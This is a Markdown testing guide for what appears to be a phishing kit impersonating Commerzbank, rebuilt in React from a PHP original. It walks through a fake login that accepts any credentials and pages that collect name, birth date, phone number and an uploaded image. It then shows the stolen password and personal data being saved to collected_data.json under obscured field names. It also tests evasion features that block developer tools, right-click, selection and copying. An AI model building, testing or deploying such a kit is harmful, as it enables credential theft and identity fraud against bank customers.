# Testing the React Application

## Manual Testing Steps

### 1. Start the Application

```bash
# Terminal 1 - Start backend
cd backend
npm start

# Terminal 2 - Start frontend
cd ..
npm start
```

### 2. Test the Application Flow

1. **Login Page** (`http://localhost:3000/login`)
   - Enter any username and password
   - Click "Anmelden" button
   - Should redirect to info page

2. **Info Page** (`http://localhost:3000/info`)
   - Fill in personal information:
     - Vorname: Test
     - Nachname: User
     - Geburtsdatum: 01.01.1990
     - Telefonnummer: 1234567890
   - Click "Weiter" button
   - Should redirect to upload page

3. **Upload Page** (`http://localhost:3000/upload`)
   - Select an image file (JPG, PNG, or GIF)
   - Click "Datei hochladen" button
   - Should redirect to done page

4. **Done Page** (`http://localhost:3000/done`)
   - Should show success message
   - Click "Zur Anmeldung" to return to login

### 3. Test Security Features

1. **Developer Tools Blocking**
   - Try pressing F12 - should be blocked
   - Try Ctrl+Shift+I - should be blocked
   - Try Ctrl+Shift+C - should be blocked
   - Try Ctrl+Shift+J - should be blocked

2. **Right-click Prevention**
   - Right-click anywhere - context menu should not appear

3. **Text Selection Blocking**
   - Try to select text - should not work

4. **Copy/Paste Prevention**
   - Try Ctrl+C or Ctrl+V - should be blocked

### 4. Test Data Collection

Check the backend console and `backend/collected_data.json` file for collected data:

```json
[
  {
    "type": "login",
    "data": {
      "xusr": "testuser",
      "xpss": "testpass"
    },
    "timestamp": "2024-01-01T12:00:00.000Z",
    "ip": "127.0.0.1",
    "userAgent": "Mozilla/5.0..."
  },
  {
    "type": "info",
    "data": {
      "xname1": "Test",
      "xname2": "User",
      "xdob": "01.01.1990",
      "xtel": "1234567890"
    },
    "timestamp": "2024-01-01T12:00:00.000Z",
    "ip": "127.0.0.1",
    "userAgent": "Mozilla/5.0..."
  },
  {
    "type": "upload",
    "data": {
      "filename": "file-1234567890-123456789.jpg",
      "originalName": "test.jpg",
      "size": 12345,
      "xusr": "testuser",
      "xpss": "testpass",
      "xname1": "Test",
      "xname2": "User",
      "xdob": "01.01.1990",
      "xtel": "1234567890"
    },
    "timestamp": "2024-01-01T12:00:00.000Z",
    "ip": "127.0.0.1",
    "userAgent": "Mozilla/5.0..."
  },
  {
    "type": "final",
    "data": {
      "xusr": "testuser",
      "xpss": "testpass",
      "xname1": "Test",
      "xname2": "User",
      "xdob": "01.01.1990",
      "xtel": "1234567890",
      "timestamp": "2024-01-01T12:00:00.000Z",
      "ip": "127.0.0.1",
      "userAgent": "Mozilla/5.0..."
    },
    "timestamp": "2024-01-01T12:00:00.000Z",
    "ip": "127.0.0.1",
    "userAgent": "Mozilla/5.0..."
  }
]
```

### 5. Test Responsive Design

1. **Desktop View**
   - Test on different screen sizes
   - Verify Commerzbank branding is visible
   - Check form layouts

2. **Mobile View**
   - Use browser dev tools to test mobile view
   - Verify navigation works on mobile
   - Check form usability on small screens

### 6. Test Error Handling

1. **Form Validation**
   - Try submitting empty forms
   - Try invalid date formats
   - Try uploading non-image files
   - Try uploading files that are too large

2. **Network Errors**
   - Disconnect internet and try submitting forms
   - Application should handle errors gracefully

## Expected Results

- All forms should work as in the original PHP version
- Security features should block developer tools and right-click
- Data should be collected and stored in the backend
- UI should look identical to the original PHP version
- All navigation should work correctly
- File uploads should work with proper validation
- Session management should persist data across pages

## Troubleshooting

### Common Issues

1. **Backend not starting**
   - Check if port 3001 is available
   - Run `npm install` in the backend directory

2. **Frontend not connecting to backend**
   - Check if backend is running on port 3001
   - Verify API_URL in environment variables

3. **File upload not working**
   - Check if uploads directory exists in backend
   - Verify file size limits
   - Check file type validation

4. **Security features not working**
   - Check browser console for errors
   - Verify SecurityScript component is loaded
   - Test in different browsers
